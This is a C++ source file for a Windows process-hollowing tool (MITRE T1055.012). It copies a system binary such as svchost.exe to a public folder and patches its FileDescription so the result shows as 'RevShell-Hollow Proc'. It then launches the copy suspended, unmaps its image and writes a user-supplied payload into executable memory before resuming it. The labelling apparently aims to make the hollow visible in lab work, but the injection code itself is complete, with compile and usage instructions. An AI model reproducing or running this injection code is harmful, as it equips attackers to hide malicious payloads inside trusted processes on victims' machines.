/*
 * Process Hollowing v2 - identifiable hollow in Task Manager
 *
 * Difference from process_hollowing.cpp:
 *   v1 hollows svchost.exe (or whatever host you specify) with your
 *   payload. The row in Task Manager still shows "svchost.exe" with
 *   svchost's embedded FileDescription "Host Process for Windows
 *   Services" - impossible to tell your hollow from any real svchost.
 *
 *   v2 copies the host binary to a renamed path first, patches its
 *   FileDescription, THEN hollows the copy. Task Manager shows:
 *       RevShell-Hollow Proc   <-- big text (patched)
 *       RevShell_H.exe         <-- image name (renamed)
 *
 * MITRE ATT&CK: T1055.012
 *
 * Compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o hollow_v2.exe process_hollowing_v2.cpp
 *   cl /std:c++20 process_hollowing_v2.cpp /Fe:hollow_v2.exe
 *
 * Usage:
 *   hollow_v2.exe <payload.exe> [host.exe]
 *
 * Payload must be an x64 PE with imports already resolved OR position
 * independent. For complex payloads, use the full relocations + imports
 * handling in process_hollowing.cpp as a starting point.
 */

#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

typedef NTSTATUS (NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

#define RENAMED_HOST "C:\\Users\\Public\\RevShell_H.exe"
static const wchar_t* NEW_DESCRIPTION = L"RevShell-Hollow Proc";

/* Patch a UTF-16 string anywhere in the file. Replacement must be <=
 * original byte length; shorter is padded with nulls. */
static int patch_string(const char* path, const wchar_t* needle, const wchar_t* repl) {
    HANDLE h = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    DWORD size = GetFileSize(h, NULL);
    BYTE* buf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, size);
    DWORD r = 0; ReadFile(h, buf, size, &r, NULL);
    size_t nl = wcslen(needle) * 2, rl = wcslen(repl) * 2;
    int patched = 0;
    if (rl <= nl) {
        for (DWORD i = 0; i + nl <= size; ++i) {
            if (memcmp(buf + i, needle, nl) == 0) {
                memcpy(buf + i, repl, rl);
                for (size_t j = rl; j < nl; ++j) buf[i + j] = 0;
                patched = 1;
            }
        }
    }
    if (patched) { SetFilePointer(h, 0, NULL, FILE_BEGIN); DWORD w; WriteFile(h, buf, size, &w, NULL); }
    HeapFree(GetProcessHeap(), 0, buf);
    CloseHandle(h);
    return patched;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <payload.exe> [host.exe]\n", argv[0]);
        printf("  default host = svchost.exe\n");
        return 1;
    }
    const char* payloadPath = argv[1];
    const char* hostName    = argc > 2 ? argv[2] : "svchost.exe";

    char origHostPath[MAX_PATH];
    if (strchr(hostName, '\\'))
        strncpy_s(origHostPath, MAX_PATH, hostName, _TRUNCATE);
    else
        snprintf(origHostPath, MAX_PATH, "C:\\Windows\\System32\\%s", hostName);

    /* Step 1: copy host to the renamed path and patch its FileDescription.
     * svchost.exe's VERSIONINFO contains "Host Process for Windows Services"
     * as FileDescription - we replace it. */
    printf("[*] Copying %s -> %s\n", origHostPath, RENAMED_HOST);
    if (!CopyFileA(origHostPath, RENAMED_HOST, FALSE)) {
        printf("[-] CopyFile failed (%lu)\n", GetLastError()); return 1;
    }

    /* Try common svchost description first */
    int patched = patch_string(RENAMED_HOST,
        L"Host Process for Windows Services", NEW_DESCRIPTION);
    if (!patched) {
        /* Fallback for cmd.exe-style hosts */
        patched = patch_string(RENAMED_HOST,
            L"Windows Command Processor", NEW_DESCRIPTION);
    }
    if (patched) printf("[+] Patched host's FileDescription\n");
    else         printf("[!] FileDescription not patched (unknown host string)\n");

    /* Step 2: standard hollowing against the renamed, patched copy.
     * Keep this abridged - full relocations + imports in v1. */
    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { printf("[-] Open payload\n"); return 1; }
    DWORD fsize = GetFileSize(hFile, NULL);
    BYTE* fbuf = (BYTE*)VirtualAlloc(NULL, fsize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    DWORD read; ReadFile(hFile, fbuf, fsize, &read, NULL);
    CloseHandle(hFile);

    IMAGE_DOS_HEADER* dh = (IMAGE_DOS_HEADER*)fbuf;
    IMAGE_NT_HEADERS* nh = (IMAGE_NT_HEADERS*)(fbuf + dh->e_lfanew);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(RENAMED_HOST, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess (%lu)\n", GetLastError()); return 1;
    }
    printf("[+] Suspended host: PID %lu\n", pi.dwProcessId);

    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);
    ULONGLONG hostBase = 0;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &hostBase, 8, NULL);

    pNtUnmapViewOfSection NtUnmapViewOfSection =
        (pNtUnmapViewOfSection)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmapViewOfSection(pi.hProcess, (PVOID)hostBase);

    PVOID remote = VirtualAllocEx(pi.hProcess, (PVOID)nh->OptionalHeader.ImageBase,
        nh->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) remote = VirtualAllocEx(pi.hProcess, NULL,
        nh->OptionalHeader.SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(pi.hProcess, remote, fbuf, nh->OptionalHeader.SizeOfHeaders, NULL);
    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nh);
    for (int i = 0; i < nh->FileHeader.NumberOfSections; ++i) {
        if (sh[i].SizeOfRawData) {
            WriteProcessMemory(pi.hProcess, (BYTE*)remote + sh[i].VirtualAddress,
                fbuf + sh[i].PointerToRawData, sh[i].SizeOfRawData, NULL);
        }
    }

    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &remote, 8, NULL);
    ctx.Rcx = (ULONGLONG)remote + nh->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    printf("[+] Hollowed. Task Manager shows:\n");
    printf("    big text = \"RevShell-Hollow Proc\"\n");
    printf("    image    = \"RevShell_H.exe\"\n");

    VirtualFree(fbuf, 0, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
